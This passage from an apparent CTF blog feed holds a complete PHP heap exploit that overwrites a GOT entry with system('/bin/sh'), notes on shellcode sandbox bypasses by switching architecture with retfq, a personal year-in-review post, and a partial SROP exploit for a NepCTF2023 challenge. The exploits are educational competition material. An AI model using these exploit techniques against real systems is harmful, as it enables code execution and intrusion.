href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>It`s not the final edition because functions like <code>chr()</code> are banned in the docker, and getting shell is usually not allowed in PHP pwn. I preserved them to make it more readable.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// function mychr($index)&#123;</span></span><br><span class="line"><span class="comment">// return [&#x27;\x00&#x27;, &#x27;\x01&#x27;, &#x27;\x02&#x27;, &#x27;\x03&#x27;, &#x27;\x04&#x27;, &#x27;\x05&#x27;, &#x27;\x06&#x27;, &#x27;\x07&#x27;, &#x27;\x08&#x27;, &#x27;\t&#x27;, &#x27;\n&#x27;, &#x27;\x0b&#x27;, &#x27;\x0c&#x27;, &#x27;\r&#x27;, &#x27;\x0e&#x27;, &#x27;\x0f&#x27;, &#x27;\x10&#x27;, &#x27;\x11&#x27;, &#x27;\x12&#x27;, &#x27;\x13&#x27;, &#x27;\x14&#x27;, &#x27;\x15&#x27;, &#x27;\x16&#x27;, &#x27;\x17&#x27;, &#x27;\x18&#x27;, &#x27;\x19&#x27;, &#x27;\x1a&#x27;, &#x27;\x1b&#x27;, &#x27;\x1c&#x27;, &#x27;\x1d&#x27;, &#x27;\x1e&#x27;, &#x27;\x1f&#x27;, &#x27; &#x27;, &#x27;!&#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &quot;&#x27;&quot;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;*&#x27;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;.&#x27;, &#x27;/&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;, &#x27;;&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;?&#x27;, &#x27;@&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;[&#x27;, &#x27;\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;_&#x27;, &#x27;`&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;&#123;&#x27;, &#x27;|&#x27;, &#x27;&#125;&#x27;, &#x27;~&#x27;, &#x27;\x7f&#x27;, &#x27;\x80&#x27;, &#x27;\x81&#x27;, &#x27;\x82&#x27;, &#x27;\x83&#x27;, &#x27;\x84&#x27;, &#x27;\x85&#x27;, &#x27;\x86&#x27;, &#x27;\x87&#x27;, &#x27;\x88&#x27;, &#x27;\x89&#x27;, &#x27;\x8a&#x27;, &#x27;\x8b&#x27;, &#x27;\x8c&#x27;, &#x27;\x8d&#x27;, &#x27;\x8e&#x27;, &#x27;\x8f&#x27;, &#x27;\x90&#x27;, &#x27;\x91&#x27;, &#x27;\x92&#x27;, &#x27;\x93&#x27;, &#x27;\x94&#x27;, &#x27;\x95&#x27;, &#x27;\x96&#x27;, &#x27;\x97&#x27;, &#x27;\x98&#x27;, &#x27;\x99&#x27;, &#x27;\x9a&#x27;, &#x27;\x9b&#x27;, &#x27;\x9c&#x27;, &#x27;\x9d&#x27;, &#x27;\x9e&#x27;, &#x27;\x9f&#x27;, &#x27;\xa0&#x27;, &#x27;¡&#x27;, &#x27;¢&#x27;, &#x27;£&#x27;, &#x27;¤&#x27;, &#x27;¥&#x27;, &#x27;¦&#x27;, &#x27;§&#x27;, &#x27;¨&#x27;, &#x27;©&#x27;, &#x27;ª&#x27;, &#x27;«&#x27;, &#x27;¬&#x27;, &#x27;\xad&#x27;, &#x27;®&#x27;, &#x27;¯&#x27;, &#x27;°&#x27;, &#x27;±&#x27;, &#x27;²&#x27;, &#x27;³&#x27;, &#x27;´&#x27;, &#x27;µ&#x27;, &#x27;¶&#x27;, &#x27;·&#x27;, &#x27;¸&#x27;, &#x27;¹&#x27;, &#x27;º&#x27;, &#x27;»&#x27;, &#x27;¼&#x27;, &#x27;½&#x27;, &#x27;¾&#x27;, &#x27;¿&#x27;, &#x27;À&#x27;, &#x27;Á&#x27;, &#x27;Â&#x27;, &#x27;Ã&#x27;, &#x27;Ä&#x27;, &#x27;Å&#x27;, &#x27;Æ&#x27;, &#x27;Ç&#x27;, &#x27;È&#x27;, &#x27;É&#x27;, &#x27;Ê&#x27;, &#x27;Ë&#x27;, &#x27;Ì&#x27;, &#x27;Í&#x27;, &#x27;Î&#x27;, &#x27;Ï&#x27;, &#x27;Ð&#x27;, &#x27;Ñ&#x27;, &#x27;Ò&#x27;, &#x27;Ó&#x27;, &#x27;Ô&#x27;, &#x27;Õ&#x27;, &#x27;Ö&#x27;, &#x27;×&#x27;, &#x27;Ø&#x27;, &#x27;Ù&#x27;, &#x27;Ú&#x27;, &#x27;Û&#x27;, &#x27;Ü&#x27;, &#x27;Ý&#x27;, &#x27;Þ&#x27;, &#x27;ß&#x27;, &#x27;à&#x27;, &#x27;á&#x27;, &#x27;â&#x27;, &#x27;ã&#x27;, &#x27;ä&#x27;, &#x27;å&#x27;, &#x27;æ&#x27;, &#x27;ç&#x27;, &#x27;è&#x27;, &#x27;é&#x27;, &#x27;ê&#x27;, &#x27;ë&#x27;, &#x27;ì&#x27;, &#x27;í&#x27;, &#x27;î&#x27;, &#x27;ï&#x27;, &#x27;ð&#x27;, &#x27;ñ&#x27;, &#x27;ò&#x27;, &#x27;ó&#x27;, &#x27;ô&#x27;, &#x27;õ&#x27;, &#x27;ö&#x27;, &#x27;÷&#x27;, &#x27;ø&#x27;, &#x27;ù&#x27;, &#x27;ú&#x27;, &#x27;û&#x27;, &#x27;ü&#x27;, &#x27;ý&#x27;, &#x27;þ&#x27;, &#x27;ÿ&#x27;][$index];</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tobytes</span>(<span class="params"><span class="variable">$integerValue</span>, <span class="variable">$byteLength</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$byteString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$byteLength</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$byteString</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$integerValue</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        <span class="variable">$integerValue</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$byteString</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number1&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00/bin/shacaaadaaaeaaafaaagaaahaaaiaaajaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$fd</span>=<span class="title function_ invoke__">list_note</span>();</span><br><span class="line"><span class="variable">$fd</span> = <span class="variable">$fd</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$decimalValue</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">6</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$char</span> = <span class="variable">$fd</span>[-<span class="variable">$i</span>];</span><br><span class="line">    <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>);</span><br><span class="line">    <span class="variable">$decimalValue</span> = (<span class="variable">$decimalValue</span> &lt;&lt; <span class="number">8</span>) | <span class="variable">$digit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$heap_base</span> = <span class="variable">$decimalValue</span> - <span class="number">0x1480</span>;</span><br><span class="line"><span class="variable">$target_libc</span> = <span class="variable">$heap_base</span> + <span class="number">0x82000</span>; </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00aaaabaaacaaadaaaeaaafaaagaaahaaa\xff\x00\x00\x00\x00\x00\x00\x00&quot;</span> . <span class="title function_ invoke__">tobytes</span>(<span class="variable">$target_libc</span>,<span class="number">8</span>));</span><br><span class="line"><span class="variable">$libc_off</span> = <span class="title function_ invoke__">view_note</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$libc</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">5</span>; <span class="variable">$i</span> &gt;= <span class="number">0</span>; <span class="variable">$i</span>--) &#123;</span><br><span class="line">    <span class="variable">$char</span> = <span class="variable">$libc_off</span>[<span class="variable">$i</span>];</span><br><span class="line">    <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>);</span><br><span class="line">    <span class="variable">$libc</span> = (<span class="variable">$libc</span> &lt;&lt; <span class="number">8</span>) | <span class="variable">$digit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$libc</span> -= <span class="number">0x219aa0</span>;</span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;%x&quot;</span>,<span class="variable">$libc</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$heaphp_base</span> = <span class="variable">$libc</span> + <span class="number">0x7af000</span>;</span><br><span class="line"><span class="variable">$sys_addr</span> = <span class="variable">$libc</span> + <span class="number">0x50d60</span>;</span><br><span class="line"><span class="variable">$efree_got_addr</span> = <span class="variable">$heaphp_base</span> + <span class="number">0x4058</span>;</span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00aaaabaaacaaadaaaeaaafaaagaaahaaa\xff\x00\x00\x00\x00\x00\x00\x00&quot;</span> . <span class="title function_ invoke__">tobytes</span>(<span class="variable">$efree_got_addr</span>,<span class="number">8</span>));</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;./readflag&quot;</span>,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">edit_note</span>(<span class="number">1</span>,<span class="title function_ invoke__">tobytes</span>(<span class="variable">$sys_addr</span>,<span class="number">8</span>));</span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tricks of Shellcode</title>
      <link href="/Tricks-of-Shellcode/"/>
      <url>/Tricks-of-Shellcode/</url>
      
        <content type="html"><![CDATA[<blockquote><p>最近打了挺多比赛，碰到一些比较有意思的题和方法</p></blockquote><p>shellcode的题挺多，往往都是加了一些乱七八糟的限制。一般要么限制字符，要么开沙箱。限制字符基本上就通过手搓<del>我不会</del>或者alpha3之类的工具实现，这里讲一些绕过沙箱的办法。</p><h1 id="切换架构"><a href="#切换架构" class="headerlink" title="切换架构"></a>切换架构</h1><p>题目不仅禁止getshell，甚至限制了orw，如果沙箱没有对系统架构进行检查，就可以使用切换架构的方式。</p><p>原理是沙箱通过检测系统调用号判断是否放行，而64位和32位架构下的系统调用号又不相同，切换到另一种架构，就能实现绕过黑名单检查</p><p>这种手法听起来很炫酷，操作却相当简单</p><p>程序运行时的架构，是由<code>cs</code>寄存器控制的。<code>cs=0x23</code>为32位模式，<code>cs=0x33</code>为64位模式。而<code>retfq</code>指令就能实现对<code>cs</code>的赋值</p><p><code>retfq</code>包含<code>ret</code>和<code>pop cs</code>两步，也就是先后pop <code>rip</code>和<code>cs</code>，所以一般可以像这样写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rsp, 0x40404040 #arbitrary stack</span><br><span class="line">push 0x23 #or 0x33</span><br><span class="line">push 0x401145 #next shellcode</span><br><span class="line">retfq</span><br></pre></td></tr></table></figure><p>注意这里需要设置<code>rsp</code>，这是因为切换到32位时，寄存器也会被切成32位，所以需要预先调整栈顶的指针</p><p>另外我在操作时发现<code>ret</code>后的地址似乎有一定要求。起初我直接跳到下一条shellcode上，但会在retfq时崩溃，后来我<code>ret</code>到代码段里调用shellcode的地址，再提前设置好寄存器，顺利解决了这个问题</p><h1 id="者行孙"><a href="#者行孙" class="headerlink" title="者行孙"></a>者行孙</h1><p><del>你就说是不是一个东西吧</del></p><p>没有open的可以用openat代替</p><p>没有read的可以用pread64&#x2F;writev代替</p><p><a href="https://evian-zhang.github.io/introduction-to-linux-x86_64-syscall/src/filesystem/read-pread64-readv-preadv-preadv2.html">read, pread64, readv, preadv, preadv2系统调用</a></p><p>这么玩就没意思了</p><h1 id="使用socket"><a href="#使用socket" class="headerlink" title="使用socket"></a>使用socket</h1><p>有空看看</p><p><a href="http://blog.eonew.cn/2019-06-03.%E5%8F%8D%E5%90%91shellcode.html">EX大佬的博客</a></p><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>挺有趣的做法，找时间再详细研究下</p><p><a href="https://m1ku.in/archives/737">m1ku大佬的博客</a></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>摸</title>
      <link href="/%E6%91%B8/"/>
      <url>/%E6%91%B8/</url>
      
        <content type="html"><![CDATA[<p>在电专摸了一年，不知不觉已经成了老油条的形状</p><p>大一整体处于一个比较迷茫的状态。开学时，机缘巧合下碰见了凝聚的招新赛，靠着热情冲了一个月，以pwn手的身份进入，随后就开始<strong>长达一个半学期</strong>的摸鱼期。期间或是卷分数（集电学院的风气懂的都懂），或是搞一些乱七八糟的比赛（也没有什么成绩），更多的时候，记忆缺失，大抵是在摸鱼罢</p><p>后来大一下，去了趟ASC的观摩，认识了一些凝聚的学长和Beetoven，还认识了南昌大学的cs佬。突然觉得，搞这些也挺有意思。此后开始参与更多凝聚的活动（并捡起所剩不多的pwn知识</p><p>接着就是国赛初赛，人生第二次来到工作室，社恐得宛如一个新生。好在初赛有些简单题，挺适合我这种招新赛水平选手康复。最后还是顺利进了复赛</p><p>复赛的时候连堆都不会，纯fw，挺可惜，还是和Casio3组的队。事后痛定思痛，决定以后不摸了</p><p>此时的我怎么也想不到，一个月之后，我会在讲台上给人讲高版本堆利用（</p><p>培训前还有个小插曲，<del>因为军训的某种神必力量</del>，鄙人全身起疹子在医院躺了一周</p><p>暑假期间打了一些比赛，<del>感觉我怎么什么都不会</del>感觉我的二进制之旅才刚刚开始</p><hr><p>摸过来的这一年，成绩不上不下，好在没有掉出保研线。二进制依旧是一个新人的水平，想到马上又要迎接下一届新人，不禁感到汗颜。</p><p>最近和学长们聊天比较多，对自己的未来逐渐也有了一些规划。目前主要精力还是会放在二进制上，并开始涉足密码学</p><p>毕竟是新学期，还是立几个flag吧（什么？哪里有flag？我直接cat）</p><ul><li><input disabled="" type="checkbox"> 养成写博客输出知识的习惯，尝试英文写作</li><li><input disabled="" type="checkbox"> 多参加ctf，丰富经历</li><li><input disabled="" type="checkbox"> 学习内核漏洞利用</li><li><input disabled="" type="checkbox"> 不熬夜，多锻炼</li></ul>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 摸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SROP初见杀-NepCTF2023</title>
      <link href="/SROP/"/>
      <url>/SROP/</url>
      
        <content type="html"><![CDATA[<p>这次比赛第一题就是很明显的<strong>SROP</strong>，正好啥也不会，学习了一下</p><h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><p><strong>SROP</strong>全称为<strong>Sigreturn Oriented Programming</strong>，其攻击核心为通过伪造一个<strong>Signal Frame</strong>（以下简称<strong>sigFrame</strong>）在栈上，同时触发<strong>sigreturn</strong>系统调用，让内核为我们恢复一个sigFrame所描述的进程，如一个shell、一个wrtie系统调用打印栈地址等，同时通过对sigFrame中rsp和rip的修改，连接多个sigFrame，可通过多次触发sigreturn系统调用，依次恢复多个sigFrame，实现不同的功能，构成SROP攻击。一个sigFrame可理解为一个进程被挂起时，用于保存进程的数据结构，当进程恢复时，通过触发sigreturn来恢复sigFrame，从而恢复一个进程。</p><p>以上内容是抄的，说白了就是：进程受到一个signal进入中断，内核会保存上下文（寄存器状态之类的，这个上下文存在<strong>sigFrame</strong>中），随后进入用户态执行处理函数，处理完最后又进入内核态恢复上下文</p><p><img src="/../img/SROP.assets/image-20230812205434238.png" alt="image-20230812205434238"></p><p>而这个保存上下文的sigFrame完全在<strong>用户空间</strong>，并且内核对进程挂起时保存的sigFrame以及恢复时还原的sigFrame<strong>没有做任何关联</strong>，这导致sigFrame可以被伪造</p><p><img src="/../img/SROP.assets/image-20230812205639153.png" alt="image-20230812205639153"></p><p>上图是64位的sigFrame结构。恢复上下文之前，会调用处理函数<strong>Signal Handler</strong>，该函数最后一个指令是<code>ret</code>，此时<code>rsp</code>正好指向sigFrame的栈顶，也就是存有函数<code>rt_sigreturn</code>地址的位置。随后调用<code>rt_sigreturn</code>，通过该函数完成上下文的恢复。</p><p>因此，我们可以在<code>rsp</code>附近伪造sigFrame，通过调用<code>rt_sigreturn</code>完成寄存器的布置</p><p>调用可以直接写内存，更常见的是进行调用号为0xf的系统调用</p><blockquote><p>小技巧：系统调用号可以通过<code>cat /usr/include/asm/unistd_64.h</code>查看</p></blockquote><p>另外，pwntools中的<code>SigreturnFrame()</code>可以方便完成寄存器的布置</p><h1 id="Nepctf2023-SROP"><a href="#Nepctf2023-SROP" class="headerlink" title="Nepctf2023-SROP"></a>Nepctf2023-SROP</h1><p>源码都喂我嘴里了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -no-pie pwn.c -fno-stack-protector -z now -o pwn  -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x30</span>]=<span class="string">&quot;welcome to NepCTF2023!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seccomp</span><span class="params">()</span>&#123;</span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), <span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sys</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">15</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">     <span class="type">char</span> bd[<span class="number">0x30</span>];</span><br><span class="line">     seccomp();</span><br><span class="line">     syscall(<span class="number">1</span>,<span class="number">1</span>,buf,<span class="number">0x30</span>);</span><br><span class="line">     <span class="keyword">return</span> syscall(<span class="number">0</span>,<span class="number">0</span>,bd,<span class="number">0x300</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然需要打一个orw</p><p>注意这里有一个坑，众所周知，<code>syscall</code>的系统调用号是通过<code>rax</code>传递，然而我们反汇编之后</p><p><img src="/../img/SROP.assets/image-20230812211245122.png" alt="image-20230812211245122"></p><p>令人意外的是，这里的<code>syscall</code>都是通过<code>rdi</code>传调用号的，猜测与这里使用<code>call syscall</code>而非直接使用<code>syscall</code>有关</p><p>既然不用<code>rax</code>传调用号，那题目中的<code>sys()</code>函数也就没有意义了，好在能找到<code>pop rdi</code>的gadgets，可以任意布置</p><p>我的思路是，先打一次srop，把flag写到bss段，顺便把栈迁移过去，随后挨着打orw</p><p><strong>伪造sigFreame</strong>时需要<strong>格外注意</strong></p><p><code>cs</code> <code>gs</code> <code>fs</code> <code>ss</code>需要<strong>保持不变</strong>！否则会报错！</p><p>本人就在这里排查了很久</p><p>可以按照如下写法</p><p><code>sig.csgsfs = (0x002b * 0x1000000000000) | (0x0000 * 0x100000000) | (0x0000 * 0x10000) | (0x0033 * 0x1)</code></p><p>从左往右依次为<code>cs</code> <code>gs</code> <code>fs</code> <code>ss</code></p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b *0x0000000004007AE\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;nepctf.1cepeak.cn&quot;</span></span><br><span class="line">port = <span class="number">30551</span></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(host, port)</span><br><span class="line"></span><br><span class="line">sig = <span class="number">0x0000000000400750</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400813</span></span><br><span class="line">syscall = <span class="number">0x00000000004007A8</span></span><br><span class="line">buf = <span class="number">0x0000000000601020</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">0x38</span> +p64(pop_rdi)+p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">0</span></span><br><span class="line">sig.rsi = <span 